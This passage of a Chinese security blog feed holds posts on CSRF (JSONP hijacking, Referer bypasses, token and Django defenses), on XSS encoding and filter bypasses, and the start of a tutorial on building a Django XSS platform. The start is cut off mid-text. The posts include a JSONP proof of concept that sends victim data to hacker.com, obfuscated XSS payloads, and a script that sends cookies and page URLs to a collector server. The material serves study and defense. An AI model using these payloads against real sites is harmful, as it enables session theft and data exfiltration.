Ajax</h3><p>&#160;&#160;&#160;&#160;除了通过HTML标签发送跨域请求外，还可以通过Ajax来发送跨域情况，不过Ajax是严格遵守CORS规则的。<br>&#160;&#160;&#160;&#160;关于CORS规则，不清楚的可以去看看<strong>evoA</strong>大佬的一篇文章<a href="https://xz.aliyun.com/t/4470#toc-11" target="_blank" rel="noopener">跨域方式及其产生的安全问题</a>。<br>&#160;&#160;&#160;&#160;简单来说就是需要构造的xhr的<code>withCredentials</code>属性也为<code>true</code>才能带上Cookie进行跨域请求，与IE兼容性不好，且构造难度较Html复杂，故通常情况下我们不使用Ajax来进行CSRF攻击。<br>&#160;&#160;&#160;&#160;通常使用Ajax来跨域进行CSRF攻击的漏洞一般都配合XSS漏洞，此时的Ajax与目标域相同，不受CORS的限制。  </p><h2 id="0x05-CSRF利用实例"><a href="#0x05-CSRF利用实例" class="headerlink" title="0x05 CSRF利用实例"></a>0x05 CSRF利用实例</h2><h3 id="1-常用利用方式"><a href="#1-常用利用方式" class="headerlink" title="1) 常用利用方式"></a>1) 常用利用方式</h3><p>&#160;&#160;&#160;&#160;攻击者构造恶意html，通过引诱用户/管理员访问，触发CSRF漏洞。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/25/5c98c737b44f7.png"></p><h3 id="2-结合XSS利用"><a href="#2-结合XSS利用" class="headerlink" title="2) 结合XSS利用"></a>2) 结合XSS利用</h3><p>&#160;&#160;&#160;&#160;CSRF+XSS结合，产生的危害已几何倍数剧增。如果CSRF和XSS两个漏洞是在同一个域下的话，那么此时的CSRF已经变成了OSRF了，即本站点请求伪造(出自黑客攻防技术宝典Web实战篇第二版p366)，此时已经变成XSS的请求伪造攻击，本文不在赘述。  </p><h3 id="3-jsonp"><a href="#3-jsonp" class="headerlink" title="3) jsonp"></a>3) jsonp</h3><p>&#160;&#160;&#160;&#160;我们知道网站api返回的数据类型一般为json型或Array型，这里我们仅讨论json型。<br>&#160;&#160;&#160;&#160;当我们需要调用远程api时json返回的数据一般如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user(&#123;&quot;name&quot;:&quot;Yunen&quot;,&quot;work&quot;:&quot;Student&quot;,&quot;xxxx&quot;:&quot;xxxxxxxxx&quot;,......&#125;)</span><br></pre></td></tr></table></figure><br>&#160;&#160;&#160;&#160;这是因为开发者如果需要调用远程服务器的api获取json数据，由于同源策略的限制，通过ajax获取就会显得比较麻烦，相比之下<code>&lt;script&gt;</code>标签的开放策略，无疑是最好的方法去弥补这一缺陷，使得json数据可以进行方便的跨域传输。此处的user为回调函数名，一般为某个请求参数值(比如：<strong>callback</strong>)，就上述例子说，只需要通过下面方法即可调用返回的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function user(data)&#123;</span><br><span class="line">        console.log(data);&#x2F;&#x2F;此时的json数据已经存储进了data变量中    </span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/25/5c98cf9a343b8.png"><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/25/5c98d67b2238c.png"><br>&#160;&#160;&#160;&#160;这种远程api接口十分容易受到CSRF攻击，我们可以通过修改<strong>callback</strong>参数值并添加自定义函数，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function jsonphack(data)&#123;</span><br><span class="line">        new image().src&#x3D;&quot;http:&#x2F;&#x2F;hacker.com&#x2F;json.php?data&#x3D;&quot;+escape(data);</span><br><span class="line">        &#x2F;&#x2F;将json返回的数据发送到黑客服务器上</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?callback&#x3D;jsonphack&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></p><h3 id="4-更多例子"><a href="#4-更多例子" class="headerlink" title="4) 更多例子"></a>4) 更多例子</h3><p><a href="https://www.freebuf.com/articles/web/55965.html" target="_blank" rel="noopener">从零开始学CSRF</a><br><a href="https://xz.aliyun.com/t/1673" target="_blank" rel="noopener">Web安全系列 – Csrf漏洞</a><br><a href="https://xz.aliyun.com/t/2384" target="_blank" rel="noopener">phpMyAdmin 4.7.x CSRF 漏洞利用</a>  </p><h2 id="0x06-防御CSRF攻击"><a href="#0x06-防御CSRF攻击" class="headerlink" title="0x06 防御CSRF攻击"></a>0x06 防御CSRF攻击</h2><p>&#160;&#160;&#160;&#160;前边我们说到，产生CSRF的原因主要有两点，那么我们可以针对这两点进行相应的防御。</p><h3 id="1-Token"><a href="#1-Token" class="headerlink" title="1) Token"></a>1) Token</h3><p>&#160;&#160;&#160;&#160;我们知道CSRF攻击的请求除了Cookie以外，其他的内容必须提前确定好，那么如果我们在服务端要求提交的某一个参数中是随机的值呢？<br>&#160;&#160;&#160;&#160;这里我们称这个随机的、无法被预计的值叫做Token，一般是由服务端在接收到用户端请求后生成，返回给用户的Token通常放置在<strong>hidden</strong>表单或用户的<strong>Cookie</strong>里。<br>&#160;&#160;&#160;&#160;当用户打开正常的发送请求的页面时，服务器会生成一串随机的Token值给浏览器，在发送请求时带上此Token，服务端验证Token值，如果相匹配才执行相应的操作、<strong>销毁</strong>原Token以及生成并返回<strong>新</strong>的Token给用户，这样做不仅仅起到了<strong>防御CSRF</strong>的作用，还可以防止<strong>表单的重复提交</strong>。<br>&#160;&#160;&#160;&#160;由于HTML标签产生的合法跨域只能是单向请求，无法通过CSRF直接取返回的内容，所以我们无法使用CSRF先取Token值再构造请求，这使得Token可以起到防御CSRF的作用。<br>&#160;&#160;&#160;&#160;注意Token不应该放置在网页的<strong>Url</strong>中，如果放在Url中当浏览器自动访问外部资源，如img标签的src属性指向攻击者的服务器，Token会出现作为<strong>Referer</strong>发送给外部服务器，以下为相关实例：  </p><ul><li>WooYun-2015-136903</li></ul><h3 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2) Referer"></a>2) Referer</h3><p>&#160;&#160;&#160;&#160;前边我们提到，CSRF伪造的请求与用户正常的请求相比最大的区别就是请求头中的<strong>Referer值</strong>不同，使用我们可以根据这点来防御CSRF。<br>&#160;&#160;&#160;&#160;在接收请求的服务端判断请求的Referer头是否为正常的发送请求的页面，如果不是，则进行拦截。<br>&#160;&#160;&#160;&#160;不过此方法有时也存在着一定的漏洞，比如可绕过等，所以最好还是使用Token。<br>&#160;&#160;&#160;&#160;判断Referer的一般方法就是利用正则进行判断，而判断Referer的正则一定要写全，不然就会如上所说，可绕过！曾经的Wooyun上就有许多CSRF的漏洞是由于Referer的正则不规范导致。<br>&#160;&#160;&#160;&#160;比如<code>^http\:\/\/a\.com</code>，只验证了是否Referer是否以<code>http://a.com</code>开头，可是没想到我们可以在自己的顶级域名添加一个子域名<code>http://a.com.hacker.com</code>；还有<code>http\:\/\/a\.com\/</code>，通过<code>http://hacker.com/?http://a.com/</code>绕过。以下相关例子均为Referer绕过：</p><ul><li>WooYun-2015-164067</li><li>WooYun-2015-165578</li><li>WooYun-2016-166608</li><li>WooYun-2016-167674</li></ul><p>&#160;&#160;&#160;&#160;有些网站由于历史原因会允许空Referer头，当https向http进行跳转时，使用Html标签(如img、iframe)进行CSRF攻击时，请求头是不会带上Referer的，可以达到空Referer的目的。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/26/5c9a1fd975b72.png"></p><h3 id="3-验证码"><a href="#3-验证码" class="headerlink" title="3) 验证码"></a>3) 验证码</h3><p>&#160;&#160;&#160;&#160;在发送请求前先需要输入基于服务端判断的验证码，机制与Token类似，防御CSRF效果非常好，不过此方法对用户的友好度很差。  </p><h3 id="4-关注点"><a href="#4-关注点" class="headerlink" title="4) 关注点"></a>4) 关注点</h3><p>&#160;&#160;&#160;&#160;关于CSRF的防护应首先关注高危操作的请求，比如:<strong>网上转账</strong>、<strong>修改密码</strong>等，其次应重点关注那些可以散播的，比如：<strong>分享链接</strong>、<strong>发送消息</strong>等，再者是能辅助散播的，如<strong>取用户好友信息</strong>等，因为前者加上后者制造出来的CSRF蠕虫虽不如XSS蠕虫威力大，可是也不可小觑。最后应关注那些高权限账户能够进行的<strong>特权操作</strong>，如：<strong>上传文件</strong>、<strong>添加管理员</strong>，在许多渗透测试中，便是起初利用这点一撸到底。</p><h3 id="5-防御实例：Django的CSRF防御机制"><a href="#5-防御实例：Django的CSRF防御机制" class="headerlink" title="5) 防御实例：Django的CSRF防御机制"></a>5) 防御实例：Django的CSRF防御机制</h3><p>&#160;&#160;&#160;&#160;新建个Django项目，打开项目下的<strong>settings.py</strong>文件，可以看到这么一行代码：<code>django.middleware.csrf.CsrfViewMiddleware</code><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/26/5c99fa7461ff7.png"><br>这个就是Django的CSRF防御机制，当我们发送POST请求时Django会自动检测CSRF_Token值是否正确。我们把<code>Debug</code>打开，可以看到如果我们的POST请求无CSRF_Token这个值，服务端会返回403报错。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/26/5c99fb81dcc5c.png"><br>现在我们往表单上添加CSRF_Token的验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&#x2F;login&#x2F;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &#123;% raw %&#125;&#123;&#123;% endraw %&#125;% csrf_token %&#125; &#x2F;&#x2F;添加Token</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pwd&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登陆&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><br>下图为生成的HTML，可以看到<code>{% csrf_token %}</code>这串代码被Django解析成了一个隐藏的<code>input</code>标签，其中的值为token值，当我们发送请求时必须带上这个值。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/26/5c99fdf9b1817.png"><br>只有这样Django才会接受POST请求来的数据，否则返回错误，并且原登陆页面的CSRF_Token重新生成，上一个进行销毁，很大程度上防御住了POST请求的CSRF。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/26/5c9a015bb3235.png"></p><p>补充一张暴漫系列图，引用自先知社区《聊聊CSRF漏洞攻防—-久等的暴漫》作者：<strong>farmsec</strong>：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://xianzhi.aliyun.com/forum/media/upload/picture/20171228123105-eb36ca20-eb87-1.png"></p><h2 id="0x07-CSRF的常用检测方法"><a href="#0x07-CSRF的常用检测方法" class="headerlink" title="0x07 CSRF的常用检测方法"></a>0x07 CSRF的常用检测方法</h2><h3 id="1-黑盒"><a href="#1-黑盒" class="headerlink" title="1) 黑盒"></a>1) 黑盒</h3><ul><li>首先肯定确定<strong>是否除Cookie外其他参数均可确定，即：无验证码，无Token等</strong>。</li><li>再者如果发现是<strong>Referer头判断</strong>的话，可以尝试是否可以绕过正则。</li><li>还有就是考虑能不能绕过Token，比如Url处的Token用加载攻击者服务器上的图片来获取。</li><li>最后可以考虑与XSS结合，如：攻击者使用iframe跨域，存在xss漏洞的网站插入的XSS执行代码为<code>eval(window.name)</code>，那么我们构造的iframe标签里可以添加个name属性与子页面进行通信，例子：wooyun-2015-089971。</li></ul><h3 id="2-白盒"><a href="#2-白盒" class="headerlink" title="2) 白盒"></a>2) 白盒</h3><ul><li>查看是否有Token，验证码，Referer等不确定参数判断。</li><li>判断Referer的正则是否安全。</li><li>判断Token返回的位置是否为安全位置。</li><li>判断生成的Token是否足够随机，毫无规律。</li></ul><p><em>从上到下挖掘难度依次递增</em></p><h2 id="0x08-补充说明"><a href="#0x08-补充说明" class="headerlink" title="0x08 补充说明"></a>0x08 补充说明</h2><h3 id="1-HttpOnly"><a href="#1-HttpOnly" class="headerlink" title="1) HttpOnly"></a>1) HttpOnly</h3><p>&#160;&#160;&#160;&#160;CSRF攻击不受Cookie的<strong>HttpOnly</strong>属性影响。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/26/5c9a0543ebef5.png"></p><h3 id="2-XSS漏洞情况下的CSRF"><a href="#2-XSS漏洞情况下的CSRF" class="headerlink" title="2) XSS漏洞情况下的CSRF"></a>2) XSS漏洞情况下的CSRF</h3><p>&#160;&#160;&#160;&#160;如果一个网站存在XSS漏洞，那么以上针对CSRF的防御几乎失去了作用。</p><h3 id="3-关于Flash的内容"><a href="#3-关于Flash的内容" class="headerlink" title="3) 关于Flash的内容"></a>3) 关于Flash的内容</h3><p>&#160;&#160;&#160;&#160;鉴于Flash的凉势，这里暂不做研究以节省时间。  </p><h3 id="4-目前CSRF形势"><a href="#4-目前CSRF形势" class="headerlink" title="4) 目前CSRF形势"></a>4) 目前CSRF形势</h3><p>&#160;&#160;&#160;&#160;就目前而言，CSRF这个沉睡的巨人颇有一番苏醒的意味，可导致的危害也正在逐步的为人们所知，但目前仍有许多开发人员还没有足够的安全意识，以为只要验证Cookie就能确定用户的真实意图了，这就导致了目前仍有大量潜在的CSRF漏洞的局面，CSRF是不可小觑的漏洞，希望大家看完这篇文章能对CSRF有个较为清晰的认识。</p><h2 id="0x09-结束语"><a href="#0x09-结束语" class="headerlink" title="0x09 结束语"></a>0x09 结束语</h2><p>&#160;&#160;&#160;&#160;这是我在信安之路投稿的第二篇文章，虽说内容较为基础，但也是我熟读几本相关书籍与相关文章、研究已知漏洞，所写出来的一篇半总结，半思考文章，也许里边会有些错误，麻烦各位表哥斧正，如果有想要与我交流相关内容的可以email我(asp-php#foxmail.com #换成@)。<br>&#160;&#160;&#160;&#160;最后欢迎大家多多投稿呀，真的能对自己的学习有很大帮助！</p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p>书籍：<br><strong>《Web前端黑客技术揭秘》p83-p96<br>《XSS跨站脚本攻击剖析与防御》p182-p187<br>《黑客攻防技术宝典Web实战篇第二版》p368-p374</strong><br>文章:<br><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">CSRF漏洞挖掘</a><br><a href="https://blog.csdn.net/sum_rain/article/details/37085771" target="_blank" rel="noopener">WEB安全之Token浅谈</a><br><a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">跨域方式及其产生的安全问题</a><br><a href="https://blog.csdn.net/qq_41000891/article/details/82784489" target="_blank" rel="noopener">Django中CSRF原理及应用详解</a><br><a href="https://drops.secquan.org/papers/155" target="_blank" rel="noopener">CSRF简单介绍及利用方法 | WooYun知识库</a><br><a href="https://blog.csdn.net/liwb94/article/details/80221224" target="_blank" rel="noopener">原生JSONP实现_动态加载js（利用script标签）</a></p>]]></content>
    
    <summary type="html">
    
      关于CSRF的个人学习总结
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="CSRF" scheme="https://www.0x002.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>关于我学XSS躺过的那些坑</title>
    <link href="https://www.0x002.com/2019/%E5%85%B3%E4%BA%8E%E6%88%91%E5%AD%A6XSS%E8%BA%BA%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/"/>
    <id>https://www.0x002.com/2019/关于我学XSS躺过的那些坑/</id>
    <published>2019-03-22T16:29:00.000Z</published>
    <updated>2019-06-17T15:54:21.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS字符编码"><a href="#XSS字符编码" class="headerlink" title="XSS字符编码"></a>XSS字符编码</h1><p>在学习编码绕过时由于数量多，类型相似，不太容易记得住，记得全，故做此记录。<br><a id="more"></a></p><h2 id="0x01-Html标签属性中执行"><a href="#0x01-Html标签属性中执行" class="headerlink" title="0x01 Html标签属性中执行"></a>0x01 Html标签属性中执行</h2><p>简单了解：</p><blockquote><p>Html标签属性中的XSS问题多属于javascript伪协议<br>常见的属性有：  </p><ul><li>src</li><li>lowsrc</li><li>dynsrc</li><li>url</li><li>href</li><li>action</li><li>onload</li><li>onunload</li><li>onmouseover</li><li>onerror</li><li>各种on开头的事件  </li></ul></blockquote><blockquote><p>PS：此处可不加括号，如<code>onclick=javascript:alert(1)</code>,各类教程里常见的<code>&lt;img src=javascript:alert(1)&gt;&lt;/img&gt;</code>Chrome、Firfox已失效，IE测试成功。</p></blockquote><p><strong>在Html标签中，许多标签具有执行javascript的权利，当服务器存在过滤时，我们可以尝试通过以下编码方法绕过：</strong></p><ul><li>8/10/16进制转换(<code>[.][&amp;#][&amp;#x]</code>)</li><li>利用<code>javascript:String.fromCharCode(xx,xx,xx......)</code> <strong>[xx为编码的字符串的ASCII码]</strong></li><li>JScript Encode <strong>[IE]</strong>  JS fuck等</li><li><code>data:text/html;bbase64,xxxxxxx</code> <strong>[IE下无效，Chorme、Firefox下均属于空白域，无法获取信息，不过可用作CVE攻击]</strong></li></ul><h2 id="0x02-在-lt-script-gt-lt-script-gt-中"><a href="#0x02-在-lt-script-gt-lt-script-gt-中" class="headerlink" title="0x02 在&lt;script&gt;&lt;/script&gt;中"></a>0x02 在&lt;script&gt;&lt;/script&gt;中</h2><blockquote><p>直接在script标签里执行的情况，我们通常分为以下几种利用方式：  </p><ul><li>直接导入远程XSS平台脚本</li><li>直接在<code>&lt;&gt;&lt;/&gt;</code>中写上自定义攻击脚本，如生成img标签</li></ul></blockquote><p>关于<code>&lt;&gt;&lt;/&gt;</code>中可用： </p><h3 id="1-单个拆开编码成ASCII"><a href="#1-单个拆开编码成ASCII" class="headerlink" title="1) 单个拆开编码成ASCII"></a>1) 单个拆开编码成ASCII</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode())</span><br></pre></td></tr></table></figure><h3 id="2-使用eval-执行16进制转换后的代码"><a href="#2-使用eval-执行16进制转换后的代码" class="headerlink" title="2) 使用eval()执行16进制转换后的代码"></a>2) 使用eval()执行16进制转换后的代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(\u0064\u0078......)</span><br><span class="line">eval(\x64\x78......)</span><br></pre></td></tr></table></figure><h2 id="0x03-在样式表中的编码"><a href="#0x03-在样式表中的编码" class="headerlink" title="0x03 在样式表中的编码"></a>0x03 在样式表中的编码</h2><p>样式表中可用expression和@import来执行js代码,此方法可进行适当的编码转换。<br>PS:仅在IE8.0之前的版本。</p><h3 id="1-expression"><a href="#1-expression" class="headerlink" title="1) expression"></a>1) expression</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">全角字符：</span><br><span class="line">&lt;div style&#x3D;xss:ｅｘｐｒｅｓｓｉｏｎ(alert(1))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">&lt;div style&#x3D;xss:\0065ｘｐｒｅｓｓｉｏｎ(alert(1))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;注释 [Javascript中也行]</span><br><span class="line">&lt;div sty&#x2F;**&#x2F;le&#x3D;x&#x2F;**&#x2F;ss:\0065ｘｐｒｅ&#x2F;**&#x2F;ｓｓｉｏ&#x2F;**&#x2F;ｎ(al&#x2F;**&#x2F;ert(1))&gt;</span><br></pre></td></tr></table></figure><h3 id="2-import"><a href="#2-import" class="headerlink" title="2) @import"></a>2) @import</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\和结束符\0会被浏览器忽略</span><br><span class="line">@im\po\rt jav\ascr\ipt:al\ert(1)</span><br><span class="line">@im\00po\0rt jav\00asc\0000ript:a\00lert(1)</span><br></pre></td></tr></table></figure><hr><h1 id="浏览器差异"><a href="#浏览器差异" class="headerlink" title="浏览器差异"></a>浏览器差异</h1><p>简单记录常见的浏览器差异造成的XSS  </p><h2 id="0x01-引号的差异"><a href="#0x01-引号的差异" class="headerlink" title="0x01 引号的差异"></a>0x01 引号的差异</h2><p>只有IE支持反引号<code></code> `</p><h2 id="0x02-标签的差异"><a href="#0x02-标签的差异" class="headerlink" title="0x02 标签的差异"></a>0x02 标签的差异</h2><ul><li>data协议执行代码是在Chrome下执行</li><li>Chrome下srcdoc利用：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li><li>IE下<code>&lt;img src=javascript:alert(1)&gt;</code></li><li>只要火狐支持E4X</li></ul><h2 id="0x03-过滤器差异"><a href="#0x03-过滤器差异" class="headerlink" title="0x03 过滤器差异"></a>0x03 过滤器差异</h2><p>Chrome能拦截大多数反射型XSS，Firefox次之，IE最次</p><h1 id="浏览器异常解析BUG产生XSS漏洞"><a href="#浏览器异常解析BUG产生XSS漏洞" class="headerlink" title="浏览器异常解析BUG产生XSS漏洞"></a>浏览器异常解析BUG产生XSS漏洞</h1><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/23/5c964e6f476d6.jpg"></p><h1 id="关于调用document"><a href="#关于调用document" class="headerlink" title="关于调用document"></a>关于调用document</h1><p>在刚开始学习XSS的时候总是想千方百计的想用javascript调用dom对象，比如document.cookie，却不知这个只能在javascript域[伪协议或<script></script>标签内]范围内。</p><h1 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h1><p><strong>一、src等属性在引入时如果漏洞网站协议名于xss平台相同，即可省略去，如：<code>&lt;img src=//www.baidu.com /&gt;</code></strong><br><strong>二、svg标签属于xml而不属于html</strong><br><strong>三、关于Cors跨域：使用Ajax跨域时默认是不允许带上会话数据的，不过可以在XSS平台通过设置返回的请求头<code>Access-Control-Allow-Credentials: true</code>，并且需要设置xhr的<code>withCreadential</code>属性值为true，注意此时返回的<code>Access-Control-Allow-Origin</code>不能设置为通配符true。</strong><br><strong>四、优先级：<code>function xxx(){}形式定义的函数 -&gt; == -&gt; &amp;</code></strong><br><strong>五、使用img等合法标签跨域可以带上会话信息</strong><br><strong>六、除javascript外还有vbscript、actionscript等</strong><br><strong>七、P3P协议仅仅是IE浏览器支持,通常是Hacker域名通过iframe或script等载入存在XSS漏洞的网站</strong>  </p><h1 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h1><p>XSS的恶意请求伪造与CSRF极为相似，两者的差别为：</p><ul><li>后者发出的伪造请求可为其他站点发出的，而前者都是存在XSS漏洞的站点发出的</li><li>CSRF是XSS无法替代的</li><li>CSRF可以无Javascript参与，及在黑客的网站上使用img等标签发送带Cookie(自带)的跨域请求。</li></ul><h1 id="关于XSS防御"><a href="#关于XSS防御" class="headerlink" title="关于XSS防御"></a>关于XSS防御</h1><h2 id="0x01-输出Html标签属性"><a href="#0x01-输出Html标签属性" class="headerlink" title="0x01 输出Html标签属性"></a>0x01 输出Html标签属性</h2><p>如：<code>&lt;input class=&#39;xxx&#39; value=&quot;{输出}&quot;&gt;</code> 这里的输出如果过滤/转义了<code>&quot;</code>，便不存在XSS漏洞了，因为这里的value属性不能执行js代码。   </p><h2 id="0x02-输出在注释"><a href="#0x02-输出在注释" class="headerlink" title="0x02 输出在注释"></a>0x02 输出在注释</h2><p>一定要过滤换行符！！</p><h2 id="0x03-输出在样式表"><a href="#0x03-输出在样式表" class="headerlink" title="0x03 输出在样式表"></a>0x03 输出在样式表</h2><p>过滤expression和@import还有外部图片的引用</p><h2 id="0x04-字符集"><a href="#0x04-字符集" class="headerlink" title="0x04 字符集"></a>0x04 字符集</h2><p>开头设定好字符集为 UTF-8</p><h2 id="0x05-Cookie盗取"><a href="#0x05-Cookie盗取" class="headerlink" title="0x05 Cookie盗取"></a>0x05 Cookie盗取</h2><p>设置好path、开启http_only、防止调试信息泄露和Apache400漏洞、使用Session</p>]]></content>
    
    <summary type="html">
    
      记录自己刚学XSS时常常搞不清楚的东西
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="XSS" scheme="https://www.0x002.com/tags/XSS/"/>
    
      <category term="个人笔记" scheme="https://www.0x002.com/tags/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>使用Django简单编写一个XSS平台</title>
    <link href="https://www.0x002.com/2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/"/>
    <id>https://www.0x002.com/2019/使用Django打造属于自己的XSS平台/</id>
    <published>2019-03-20T04:00:00.000Z</published>
    <updated>2019-06-17T15:50:46.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-简要描述"><a href="#1-简要描述" class="headerlink" title="1) 简要描述"></a>1) 简要描述</h1><p>&#160; &#160; &#160; &#160;原理十分简单2333,代码呆萌,大牛勿喷 &gt;_&lt;<br><a id="more"></a></p><h1 id="2-基础知识"><a href="#2-基础知识" class="headerlink" title="2) 基础知识"></a>2) 基础知识</h1><ul><li>XSS攻击基本原理和利用方法</li><li>Django框架的使用</li></ul><h1 id="3-Let’s-start"><a href="#3-Let’s-start" class="headerlink" title="3) Let’s start"></a>3) Let’s start</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>&#160; &#160; &#160; &#160;工欲善其事必先利其器，首先我们需要准备编写代码的各种工具和环境，这里不细说。我这里的环境和工具如下：</p><ul><li>python 3.7.0</li><li>pycharm</li><li>windows 10</li><li>mysql 8.0.15</li><li>Django 2.1.3  </li></ul><p>&#160; &#160; &#160; &#160;需要用到的第三方库：</p><ul><li>django</li><li>pymysql</li><li>requests</li></ul><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>&#160; &#160; &#160; &#160;我们先看一下XSS脚本是如何工作的  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var website&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&quot;;</span><br><span class="line">(function()&#123;(new Image()).src&#x3D;website+&#39;&#x2F;?keepsession&#x3D;1&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;这段代码非常简单，就是通过javascript获取有用信息，然后通过访问xss平台将信息作为GET参数传给服务器。<br>&#160; &#160; &#160; 